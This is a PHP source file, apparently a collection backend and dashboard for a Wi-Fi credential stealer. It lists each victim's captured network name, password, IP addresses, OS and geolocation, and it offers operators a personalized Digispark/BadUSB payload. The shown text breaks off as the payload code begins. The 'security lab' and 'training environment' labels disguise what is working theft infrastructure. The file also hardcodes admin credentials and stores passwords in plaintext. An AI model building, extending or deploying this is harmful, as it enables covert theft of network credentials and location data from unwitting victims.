<?php
/**
 * WiFi Stealer Dashboard – Multi-User Edition
 * Clean, modern cybersecurity UI with dark glassmorphism.
 * Includes advanced Brute-Force Rate Limiting & Cooldown Protection.
 */

session_start();
date_default_timezone_set('Asia/Kolkata');

// ──────────────────────────────────────────────────────────────
//  PATHS & DEFAULTS
// ──────────────────────────────────────────────────────────────
define('USERS_FILE',       __DIR__ . '/users.json');
define('ACTIVITY_LOG',     __DIR__ . '/activity.log');
define('THROTTLE_FILE',    __DIR__ . '/login_throttle.json');
define('CREDS_DIR',        __DIR__ . '/creds');

define('ADMIN_USER', 'Narain');
define('ADMIN_PASS', '#Narain8811#');

// Anti-Brute-Force Configuration
define('MAX_ATTEMPTS', 5);         // Max failed tries before cooldown
define('COOLDOWN_SECONDS', 30);    // Cooldown duration (seconds)

if (!is_dir(CREDS_DIR)) {
    mkdir(CREDS_DIR, 0755, true);
}

// ──────────────────────────────────────────────────────────────
//  RATE LIMITING & BRUTE FORCE PROTECTION HELPERS
// ──────────────────────────────────────────────────────────────
function get_client_ip(): string {
    return $_SERVER['HTTP_CF_CONNECTING_IP'] 
        ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
        ?? $_SERVER['REMOTE_ADDR'] 
        ?? '127.0.0.1';
}

function load_throttle(): array {
    if (!file_exists(THROTTLE_FILE)) return [];
    $raw = @file_get_contents(THROTTLE_FILE);
    $data = json_decode($raw, true);
    return is_array($data) ? $data : [];
}

function save_throttle(array $throttle): void {
    @file_put_contents(THROTTLE_FILE, json_encode($throttle, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
}

/** Check if IP or username is currently blocked by brute-force protection */
function check_rate_limit(string $ip, string $username): array {
    $throttle = load_throttle();
    $now = time();
    $key = md5(strtolower($ip . '_' . $username));

    if (isset($throttle[$key])) {
        $entry = $throttle[$key];
        // Expired block? Reset count
        if ($now < ($entry['lockout_until'] ?? 0)) {
            $remaining = $entry['lockout_until'] - $now;
            return ['blocked' => true, 'remaining' => $remaining];
        }
        // If window passed 10 minutes ago, clean up
        if ($now - ($entry['last_attempt'] ?? 0) > 600) {
            unset($throttle[$key]);
            save_throttle($throttle);
        }
    }
    return ['blocked' => false, 'remaining' => 0];
}

/** Record a failed attempt and trigger progressive cooldown */
function record_failed_attempt(string $ip, string $username): int {
    $throttle = load_throttle();
    $now = time();
    $key = md5(strtolower($ip . '_' . $username));

    $entry = $throttle[$key] ?? [
        'count' => 0,
        'lockout_until' => 0,
        'last_attempt' => 0
    ];

    $entry['count'] = ($entry['count'] ?? 0) + 1;
    $entry['last_attempt'] = $now;

    // Trigger progressive lockout
    if ($entry['count'] >= MAX_ATTEMPTS) {
        $multiplier = min(10, $entry['count'] - MAX_ATTEMPTS + 1);
        $lockTime = COOLDOWN_SECONDS * $multiplier;
        $entry['lockout_until'] = $now + $lockTime;
    }

    $throttle[$key] = $entry;
    save_throttle($throttle);

    return $entry['lockout_until'] > $now ? ($entry['lockout_until'] - $now) : 0;
}

/** Reset throttle upon successful login */
function reset_rate_limit(string $ip, string $username): void {
    $throttle = load_throttle();
    $key = md5(strtolower($ip . '_' . $username));
    if (isset($throttle[$key])) {
        unset($throttle[$key]);
        save_throttle($throttle);
    }
}

// ──────────────────────────────────────────────────────────────
//  HELPER FUNCTIONS
// ──────────────────────────────────────────────────────────────
function h($v) {
    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
}

/** Load users from JSON file, auto-creating admin Narain if missing. */
function load_users(): array {
    $defaultAdmin = [
        'username'       => ADMIN_USER,
        'password_hash'  => password_hash(ADMIN_PASS, PASSWORD_BCRYPT),
        'password_plain' => ADMIN_PASS,
        'email'          => 'narain@admin.local',
        'role'           => 'admin',
        'created_at'     => date('c'),
        'created_by'     => 'system',
        'active'         => true,
    ];

    if (!file_exists(USERS_FILE)) {
        $initial = ['users' => [$defaultAdmin]];
        @file_put_contents(USERS_FILE, json_encode($initial, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
        return [$defaultAdmin];
    }

    $raw = @file_get_contents(USERS_FILE);
    $data = json_decode($raw, true);
    $users = $data['users'] ?? [];

    $hasAdmin = false;
    foreach ($users as &$u) {
        if (strtolower($u['username'] ?? '') === strtolower(ADMIN_USER)) {
            $hasAdmin = true;
            $u['role'] = 'admin';
            $u['password_plain'] = ADMIN_PASS;
            if (empty($u['password_hash'])) {
                $u['password_hash'] = password_hash(ADMIN_PASS, PASSWORD_BCRYPT);
            }
            break;
        }
    }
    unset($u);

    if (!$hasAdmin) {
        array_unshift($users, $defaultAdmin);
        @file_put_contents(USERS_FILE, json_encode(['users' => $users], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    }

    return $users;
}

function save_users(array $users): void {
    file_put_contents(USERS_FILE, json_encode(['users' => $users], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
}

function find_user(string $username): ?array {
    foreach (load_users() as $u) {
        if (strtolower($u['username']) === strtolower($username)) {
            return $u;
        }
    }
    return null;
}

function log_activity(string $username, string $action, string $detail = ''): void {
    $ip   = get_client_ip();
    $line = implode(' | ', [date('Y-m-d H:i:s'), $username, $ip, $action, $detail]);
    file_put_contents(ACTIVITY_LOG, $line . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function user_log_file(string $username): string {
    $safe = preg_replace('/[^a-z0-9_\-]/i', '_', $username);
    return CREDS_DIR . '/' . $safe . '_wifi_creds.log';
}

function parse_capture_line($line): ?array {
    $line = trim($line);
    if ($line === '') return null;

    $fields = str_getcsv($line);
    if (count($fields) < 5) return null;

    $timeStr     = trim($fields[0] ?? '');
    $victimId    = trim($fields[1] ?? '');
    $ssid        = trim($fields[2] ?? '');
    $pass        = trim($fields[3] ?? '');
    $victimLanIp = trim($fields[4] ?? '');
    $victimOs    = trim($fields[5] ?? '');
    $publicIp    = trim($fields[6] ?? '');
    $lanIpExtra  = trim($fields[7] ?? '');
    $latitude    = trim($fields[8] ?? '');
    $longitude   = trim($fields[9] ?? '');
    $pktSummary  = trim($fields[10] ?? '');

    $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password', 'myssid', 'test'];
    if ($ssid === '' || in_array(strtolower($ssid), $badSsids, true) || in_array(strtolower($pass), ['pass', 'password', 'mypass'], true)) {
        return null;
    }
    if ($pass === '') $pass = '(Not Found)';

    $timestampRaw    = $timeStr !== '' ? $timeStr : 'unknown';
    $timestampPretty = $timestampRaw;
    if ($timestampRaw !== 'unknown') {
        $ts = strtotime($timestampRaw);
        if ($ts !== false) $timestampPretty = date('d M Y, h:i A', $ts);
    }

    $passLength   = strlen($pass);
    $allLetters   = ($pass !== '' && ctype_alpha($pass));
    $allNumbers   = ($pass !== '' && ctype_digit($pass));
    $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);

    return [
        'time_raw'     => $timestampRaw,
        'time'         => $timestampPretty,
        'victim_id'    => $victimId !== '' ? $victimId : 'unknown',
        'ssid'         => $ssid,
        'password'     => $pass,
        'len'          => $passLength,
        'weak'         => $weakPassword,
        'ip_main'      => $victimLanIp !== '' ? $victimLanIp : 'offline',
        'os'           => $victimOs    !== '' ? $victimOs    : 'unknown',
        'public_ip'    => $publicIp    !== '' ? $publicIp    : 'unknown',
        'lan_ip_extra' => $lanIpExtra  !== '' ? $lanIpExtra  : 'N/A',
        'latitude'     => $latitude    !== '' ? $latitude    : 'N/A',
        'longitude'    => $longitude   !== '' ? $longitude   : 'N/A',
        'pkt_summary'  => $pktSummary  !== '' ? $pktSummary  : 'N/A',
    ];
}

// ──────────────────────────────────────────────────────────────
//  LOGOUT
// ──────────────────────────────────────────────────────────────
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    log_activity($_SESSION['login_user'] ?? 'unknown', 'LOGOUT');
    $_SESSION = [];
    if (ini_get("session.use_cookies")) {
        $p = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $p["path"], $p["domain"], $p["secure"], $p["httponly"]);
    }
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ──────────────────────────────────────────────────────────────
//  HANDLE POST
// ──────────────────────────────────────────────────────────────
$loginError = '';
$registerError = '';
$registerSuccess = '';
$activeForm = 'login';
$clientIp = get_client_ip();

if (isset($_POST['form_type'])) {

    // ── LOGIN ──
    if ($_POST['form_type'] === 'login') {
        $u = trim($_POST['username'] ?? '');
        $p = $_POST['password'] ?? '';

        // 1. Check Rate Limiter
        $limitStatus = check_rate_limit($clientIp, $u);
        if ($limitStatus['blocked']) {
            $loginError = "Too many failed login attempts. Brute-force protection enabled. Please wait {$limitStatus['remaining']} seconds.";
            log_activity($u ?: 'unknown', 'BRUTE_FORCE_BLOCKED', "IP={$clientIp} remaining={$limitStatus['remaining']}s");
        } else {
            // Artificial delay to eliminate timing attacks
            usleep(200000); // 200ms

            $user = find_user($u);
            $match = false;

            if ($user && ($user['active'] ?? true)) {
                if (!empty($user['password_hash']) && password_verify($p, $user['password_hash'])) {
                    $match = true;
                } elseif (isset($user['password_plain']) && $user['password_plain'] === $p) {
                    $match = true;
                }
            }

            // Failsafe for Narain
            if (!$match && strtolower($u) === strtolower(ADMIN_USER) && $p === ADMIN_PASS) {
                $user = [
                    'username' => ADMIN_USER,
                    'role'     => 'admin',
                    'email'    => 'narain@admin.local',
                    'active'   => true
                ];
                $match = true;
            }

            if ($match && $user) {
                // Success - Reset failure count
                reset_rate_limit($clientIp, $u);

                $_SESSION['logged_in']  = true;
                $_SESSION['login_user'] = $user['username'];
                $_SESSION['role']       = $user['role'] ?? 'user';
                $_SESSION['email']      = $user['email'] ?? '';
                log_activity($user['username'], 'LOGIN', 'role=' . ($user['role'] ?? 'user'));
                header('Location: ' . $_SERVER['PHP_SELF']);
                exit;
            } else {
                // Failure - Record rate limit attempt
                $cooldown = record_failed_attempt($clientIp, $u);
                if ($cooldown > 0) {
                    $loginError = "Too many failed attempts. Brute-force cooldown activated. Please wait {$cooldown} seconds.";
                } else {
                    $loginError = 'Invalid username or password.';
                }
                log_activity($u ?: 'unknown', 'FAILED_LOGIN', "IP={$clientIp}");
            }
        }
    }

    // ── USER SELF-REGISTRATION ──
    elseif ($_POST['form_type'] === 'user_register') {
        $activeForm = 'register';
        $regUser  = trim($_POST['reg_username'] ?? '');
        $regEmail = trim($_POST['reg_email'] ?? '');
        $regPass  = $_POST['reg_password'] ?? '';

        if ($regUser === '' || $regEmail === '' || $regPass === '') {
            $registerError = 'All fields are required.';
        } elseif (!preg_match('/^[a-zA-Z0-9_\-\.]{3,30}$/', $regUser)) {
            $registerError = 'Username must be 3-30 letters or numbers.';
        } elseif (!filter_var($regEmail, FILTER_VALIDATE_EMAIL)) {
            $registerError = 'Please provide a valid email address.';
        } elseif (strlen($regPass) < 4) {
            $registerError = 'Password must be at least 4 characters.';
        } elseif (find_user($regUser) !== null || strtolower($regUser) === strtolower(ADMIN_USER)) {
            $registerError = "Username '{$regUser}' is already taken.";
        } else {
            $users = load_users();
            $newUser = [
                'username'       => $regUser,
                'password_hash'  => password_hash($regPass, PASSWORD_BCRYPT),
                'password_plain' => $regPass,
                'email'          => $regEmail,
                'role'           => 'user',
                'created_at'     => date('c'),
                'created_by'     => 'self-registered',
                'active'         => true,
            ];
            $users[] = $newUser;
            save_users($users);
            log_activity($regUser, 'SELF_REGISTER', "email={$regEmail}");

            $_SESSION['logged_in']  = true;
            $_SESSION['login_user'] = $newUser['username'];
            $_SESSION['role']       = 'user';
            $_SESSION['email']      = $newUser['email'];
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
    }
}

// ──────────────────────────────────────────────────────────────
//  LOGIN & SIGNUP VIEW
// ──────────────────────────────────────────────────────────────
if (empty($_SESSION['logged_in'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Network Security Dashboard – Access Portal</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" type="image/jpeg" href="logo.jpg">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
    background: #060913;
    background-image: 
      radial-gradient(at 10% 20%, rgba(99, 102, 241, 0.15) 0px, transparent 50%),
      radial-gradient(at 90% 80%, rgba(16, 185, 129, 0.1) 0px, transparent 50%);
    color: #f1f5f9;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }
  .auth-box {
    background: rgba(15, 23, 42, 0.75);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border-radius: 20px;
    border: 1px solid rgba(255, 255, 255, 0.08);
    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.04);
    padding: 36px 32px;
    width: 100%;
    max-width: 420px;
  }
  .header-brand {
    text-align: center;
    margin-bottom: 28px;
  }
  .brand-badge {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 64px;
    height: 64px;
    background: linear-gradient(135deg, #4f46e5 0%, #06b6d4 100%);
    border-radius: 16px;
    margin-bottom: 14px;
    box-shadow: 0 10px 25px -5px rgba(79, 70, 229, 0.5);
    overflow: hidden;
    padding: 2px;
  }
  .brand-badge img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    border-radius: 14px;
    display: block;
  }
  .brand-title {
    font-size: 22px;
    font-weight: 700;
    letter-spacing: -0.5px;
    color: #fff;
  }
  .brand-desc {
    font-size: 13px;
    color: #94a3b8;
    margin-top: 4px;
  }
  .tabs {
    display: flex;
    background: rgba(2, 6, 23, 0.6);
    border: 1px solid rgba(255, 255, 255, 0.06);
    border-radius: 12px;
    padding: 4px;
    margin-bottom: 24px;
  }
  .tab-btn {
    flex: 1;
    padding: 10px;
    border-radius: 9px;
    border: none;
    cursor: pointer;
    font-family: inherit;
    font-size: 13px;
    font-weight: 600;
    background: transparent;
    color: #64748b;
    transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
  }
  .tab-btn.active {
    background: rgba(255, 255, 255, 0.08);
    color: #fff;
    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
  }
  .tab-btn:hover:not(.active) {
    color: #cbd5e1;
  }
  .tab-panel { display: none; }
  .tab-panel.active { display: block; }
  .form-group {
    margin-bottom: 16px;
  }
  label {
    display: block;
    font-size: 12px;
    font-weight: 600;
    color: #94a3b8;
    margin-bottom: 6px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }
  input {
    width: 100%;
    padding: 12px 14px;
    font-size: 14px;
    font-family: inherit;
    border-radius: 10px;
    border: 1px solid rgba(255, 255, 255, 0.09);
    background: rgba(2, 6, 23, 0.5);
    color: #fff;
    outline: none;
    transition: all 0.2s;
  }
  input:focus {
    border-color: #6366f1;
    background: rgba(2, 6, 23, 0.8);
    box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
  }
  input::placeholder {
    color: #475569;
  }
  .btn-submit {
    width: 100%;
    padding: 13px;
    border-radius: 10px;
    border: none;
    background: linear-gradient(135deg, #4f46e5 0%, #3b82f6 100%);
    color: #fff;
    font-family: inherit;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s;
    box-shadow: 0 4px 15px rgba(79, 70, 229, 0.35);
    margin-top: 6px;
  }
  .btn-submit:hover {
    transform: translateY(-1px);
    box-shadow: 0 6px 20px rgba(79, 70, 229, 0.5);
    opacity: 0.95;
  }
  .btn-register {
    background: linear-gradient(135deg, #10b981 0%, #059669 100%);
    box-shadow: 0 4px 15px rgba(16, 185, 129, 0.35);
  }
  .btn-register:hover {
    box-shadow: 0 6px 20px rgba(16, 185, 129, 0.5);
  }
  .alert-box {
    font-size: 13px;
    color: #f87171;
    background: rgba(239, 68, 68, 0.1);
    border: 1px solid rgba(239, 68, 68, 0.25);
    border-radius: 10px;
    padding: 10px 14px;
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    gap: 8px;
    line-height: 1.4;
  }
  .shield-tag {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    font-size: 11px;
    font-weight: 600;
    color: #10b981;
    background: rgba(16, 185, 129, 0.1);
    border: 1px solid rgba(16, 185, 129, 0.2);
    border-radius: 6px;
    padding: 4px 8px;
    margin-top: 12px;
  }
  .auth-footer {
    margin-top: 24px;
    font-size: 12px;
    color: #475569;
    text-align: center;
    border-top: 1px solid rgba(255, 255, 255, 0.05);
    padding-top: 18px;
  }
</style>
</head>
<body>

<div class="auth-box">
  <div class="header-brand">
    <div class="brand-badge"><img src="logo.jpg" alt="Logo"></div>
    <h1 class="brand-title">Security Lab Portal</h1>
    <p class="brand-desc">Wi-Fi Penetration Testing & Analysis System</p>
    <div class="shield-tag">🛡️ Anti-Brute-Force Rate Limiting Active</div>
  </div>

  <div class="tabs">
    <button type="button" class="tab-btn <?php echo $activeForm==='login'?'active':''; ?>" onclick="switchAuth('login')">Sign In</button>
    <button type="button" class="tab-btn <?php echo $activeForm==='register'?'active':''; ?>" onclick="switchAuth('register')">Register New User</button>
  </div>

  <!-- LOGIN PANEL -->
  <div id="panel-login" class="tab-panel <?php echo $activeForm==='login'?'active':''; ?>">
    <?php if ($loginError !== ''): ?>
      <div class="alert-box"><span>⚠️</span> <span><?php echo h($loginError); ?></span></div>
    <?php endif; ?>

    <form method="post">
      <input type="hidden" name="form_type" value="login">
      <div class="form-group">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" required autocomplete="username" placeholder="Enter username">
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="••••••••">
      </div>
      <button type="submit" class="btn-submit">Sign In to Dashboard</button>
    </form>
  </div>

  <!-- REGISTER PANEL -->
  <div id="panel-register" class="tab-panel <?php echo $activeForm==='register'?'active':''; ?>">
    <?php if ($registerError !== ''): ?>
      <div class="alert-box"><span>⚠️</span> <span><?php echo h($registerError); ?></span></div>
    <?php endif; ?>

    <form method="post">
      <input type="hidden" name="form_type" value="user_register">
      <div class="form-group">
        <label for="reg_username">Choose Username</label>
        <input type="text" id="reg_username" name="reg_username" required placeholder="e.g. john_doe" pattern="[a-zA-Z0-9_\-\.]{3,30}">
      </div>
      <div class="form-group">
        <label for="reg_email">Email Address</label>
        <input type="email" id="reg_email" name="reg_email" required placeholder="user@domain.com">
      </div>
      <div class="form-group">
        <label for="reg_password">Choose Password</label>
        <input type="password" id="reg_password" name="reg_password" required minlength="4" placeholder="••••••••">
      </div>
      <button type="submit" class="btn-submit btn-register">Create Account</button>
    </form>
  </div>

  <div class="auth-footer">
    Closed Training Environment &copy; <?php echo date('Y'); ?>
  </div>
</div>

<script>
function switchAuth(tab) {
  document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
  if (tab === 'login') {
    document.querySelectorAll('.tab-btn')[0].classList.add('active');
    document.getElementById('panel-login').classList.add('active');
  } else {
    document.querySelectorAll('.tab-btn')[1].classList.add('active');
    document.getElementById('panel-register').classList.add('active');
  }
}
</script>
</body>
</html>
<?php
    exit;
}

// ──────────────────────────────────────────────────────────────
//  AUTHENTICATED VIEW
// ──────────────────────────────────────────────────────────────
$currentUser  = $_SESSION['login_user'];
$currentRole  = $_SESSION['role'] ?? 'user';
$currentEmail = $_SESSION['email'] ?? '';
$isAdmin      = ($currentRole === 'admin');

// Load user's captures (admin sees all if on admin view, regular user sees their own)
$allCaptures = [];
if ($isAdmin) {
    foreach (load_users() as $u) {
        $logFile = user_log_file($u['username']);
        if (!file_exists($logFile)) continue;
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $line) {
            $cap = parse_capture_line($line);
            if ($cap) {
                $cap['_owner'] = $u['username'];
                $allCaptures[] = $cap;
            }
        }
    }
} else {
    $logFile = user_log_file($currentUser);
    if (file_exists($logFile)) {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $line) {
            $cap = parse_capture_line($line);
            if ($cap) {
                $cap['_owner'] = $currentUser;
                $allCaptures[] = $cap;
            }
        }
    }
}

usort($allCaptures, fn($a, $b) => strcmp($b['time_raw'], $a['time_raw']));

// De-duplicate
$deduped = [];
$seen = [];
foreach ($allCaptures as $cap) {
    $key = $cap['_owner'] . '|' . $cap['ssid'] . '|' . $cap['password'];
    if (!isset($seen[$key])) {
        $seen[$key] = true;
        $deduped[] = $cap;
    }
}

$totalCaptures = count($deduped);
$weakCount     = count(array_filter($deduped, fn($c) => $c['weak']));
$uniqueSSIDs   = count(array_unique(array_column($deduped, 'ssid')));
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Dashboard – Security Analysis</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" type="image/jpeg" href="logo.jpg">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
    background: #090d16;
    color: #e2e8f0;
    min-height: 100vh;
    display: flex;
  }
  .sidebar {
    width: 250px;
    background: #0d121f;
    border-right: 1px solid rgba(255, 255, 255, 0.06);
    display: flex;
    flex-direction: column;
    padding: 24px 16px;
    position: fixed;
    height: 100vh;
  }
  .sidebar-logo {
    display: flex;
    align-items: center;
    gap: 12px;
    padding-bottom: 24px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    margin-bottom: 20px;
  }
  .logo-icon {
    width: 42px;
    height: 42px;
    background: linear-gradient(135deg, #4f46e5, #06b6d4);
    border-radius: 11px;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    padding: 2px;
    box-shadow: 0 4px 12px rgba(79, 70, 229, 0.35);
  }
  .logo-icon img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    border-radius: 9px;
    display: block;
  }
  .logo-title {
    font-size: 16px;
    font-weight: 700;
    color: #fff;
  }
  .logo-sub {
    font-size: 11px;
    color: #64748b;
  }
  .nav-group {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 6px;
  }
  .nav-link {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 12px 14px;
    border-radius: 10px;
    font-size: 13px;
    font-weight: 600;
    color: #94a3b8;
    text-decoration: none;
    transition: all 0.2s;
  }
  .nav-link:hover {
    color: #fff;
    background: rgba(255, 255, 255, 0.04);
  }
  .nav-link.active {
    color: #fff;
    background: rgba(99, 102, 241, 0.15);
    border: 1px solid rgba(99, 102, 241, 0.3);
  }
  .user-footer {
    padding-top: 16px;
    border-top: 1px solid rgba(255, 255, 255, 0.06);
  }
  .user-badge {
    font-size: 13px;
    font-weight: 600;
    color: #fff;
  }
  .user-email {
    font-size: 11px;
    color: #64748b;
    word-break: break-all;
    margin-top: 2px;
  }
  .btn-logout {
    display: inline-block;
    margin-top: 12px;
    font-size: 12px;
    font-weight: 600;
    color: #ef4444;
    text-decoration: none;
    transition: opacity 0.2s;
  }
  .btn-logout:hover {
    opacity: 0.8;
  }
  .main-content {
    margin-left: 250px;
    flex: 1;
    padding: 36px 40px;
    min-height: 100vh;
  }
  .top-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 30px;
  }
  .top-header h1 {
    font-size: 24px;
    font-weight: 700;
    color: #fff;
    letter-spacing: -0.5px;
  }
  .top-header p {
    font-size: 13px;
    color: #64748b;
    margin-top: 4px;
  }
  /* Stats Cards */
  .stats-row {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 18px;
    margin-bottom: 30px;
  }
  .card-stat {
    background: #0f172a;
    border: 1px solid rgba(255, 255, 255, 0.06);
    border-radius: 16px;
    padding: 20px 22px;
    position: relative;
    overflow: hidden;
  }
  .card-stat::after {
    content: '';
    position: absolute;
    top: 0;
    right: 0;
    width: 80px;
    height: 80px;
    border-radius: 50%;
    opacity: 0.08;
  }
  .stat-indigo::after { background: #6366f1; }
  .stat-rose::after   { background: #f43f5e; }
  .stat-emerald::after{ background: #10b981; }
  .card-stat .stat-label {
    font-size: 12px;
    font-weight: 600;
    color: #64748b;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }
  .card-stat .stat-value {
    font-size: 32px;
    font-weight: 800;
    color: #fff;
    margin-top: 6px;
  }
  /* Table container */
  .table-box {
    background: #0f172a;
    border: 1px solid rgba(255, 255, 255, 0.06);
    border-radius: 16px;
    overflow: hidden;
  }
  .table-header {
    padding: 20px 24px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  .table-header h2 {
    font-size: 15px;
    font-weight: 700;
    color: #fff;
  }
  table {
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
  }
  th {
    background: rgba(2, 6, 23, 0.4);
    color: #64748b;
    font-weight: 600;
    text-transform: uppercase;
    font-size: 11px;
    letter-spacing: 0.5px;
    padding: 14px 20px;
    text-align: left;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
  }
  td {
    padding: 14px 20px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.04);
    vertical-align: middle;
  }
  tr:hover td {
    background: rgba(255, 255, 255, 0.02);
  }
  .badge {
    display: inline-flex;
    align-items: center;
    font-size: 11px;
    font-weight: 600;
    padding: 4px 10px;
    border-radius: 999px;
  }
  .badge-weak {
    background: rgba(244, 63, 94, 0.15);
    color: #fda4af;
    border: 1px solid rgba(244, 63, 94, 0.3);
  }
  .badge-strong {
    background: rgba(16, 185, 129, 0.15);
    color: #6ee7b7;
    border: 1px solid rgba(16, 185, 129, 0.3);
  }
  .code-pill {
    font-family: 'JetBrains Mono', monospace;
    background: rgba(2, 6, 23, 0.6);
    padding: 4px 8px;
    border-radius: 6px;
    color: #38bdf8;
    font-size: 12px;
  }
  .owner-pill {
    background: rgba(99, 102, 241, 0.15);
    color: #a5b4fc;
    padding: 3px 8px;
    border-radius: 6px;
    font-size: 11px;
    font-weight: 600;
  }
  .empty-state {
    padding: 48px;
    text-align: center;
    color: #64748b;
    font-size: 14px;
  }
</style>
</head>
<body>

<aside class="sidebar">
  <div class="sidebar-logo">
    <div class="logo-icon"><img src="logo.jpg" alt="Logo"></div>
    <div>
      <div class="logo-title">Security Lab</div>
      <div class="logo-sub"><?php echo $isAdmin ? 'Management Console' : 'User Workspace'; ?></div>
    </div>
  </div>

  <nav class="nav-group">
    <a href="index.php" class="nav-link active">📊 My Captures</a>
    <?php if ($isAdmin): ?>
    <a href="admin.php" class="nav-link" style="color:#a5b4fc;border:1px solid rgba(99,102,241,0.25);">🛡️ Admin Control Panel</a>
    <?php endif; ?>
  </nav>

  <div class="user-footer">
    <div class="user-badge">👤 <?php echo h($currentUser); ?></div>
    <div class="user-email"><?php echo h($currentEmail); ?></div>
    <a href="?action=logout" class="btn-logout">⏻ Log out</a>
  </div>
</aside>

<main class="main-content">
  <div class="top-header">
    <div>
      <h1>Network Captures Dashboard</h1>
      <p><?php echo $isAdmin ? 'Admin View: Overview of all network testing entries.' : 'Showing your private captured credentials.'; ?></p>
    </div>
    <div>
      <button type="button" onclick="openPayloadModal()" style="display:inline-flex;align-items:center;gap:8px;padding:11px 18px;border-radius:10px;border:none;background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;font-family:inherit;font-size:13px;font-weight:600;cursor:pointer;box-shadow:0 4px 15px rgba(99,102,241,0.35);">
        ⚡ Digispark / BadUSB Payload
      </button>
    </div>
  </div>

  <!-- Digispark Payload Modal -->
  <div id="payloadModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);z-index:200;align-items:center;justify-content:center;">
    <div style="background:#0f172a;border:1px solid rgba(255,255,255,0.1);border-radius:18px;padding:28px;width:100%;max-width:680px;max-height:90vh;overflow-y:auto;">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
        <h2 style="font-size:18px;color:#fff;">⚡ Your Personalized Digispark Payload</h2>
        <button type="button" onclick="closePayloadModal()" style="background:none;border:none;color:#94a3b8;font-size:20px;cursor:pointer;">&times;</button>
      </div>
      <p style="font-size:13px;color:#94a3b8;margin-bottom:18px;">
        This payload automatically binds your account token (<strong style="color:#38bdf8;"><?php echo h($currentUser); ?></strong>) so captures route <span style="color:#10b981;font-weight:600;">only to your dashboard</span>!
      </p>

      <?php
        $host = $_SERVER['HTTP_HOST'];
        $proto = (strpos($host, 'localhost') !== false || strpos($host, '127.0.0.1') !== false) ? 'http' : 'https';
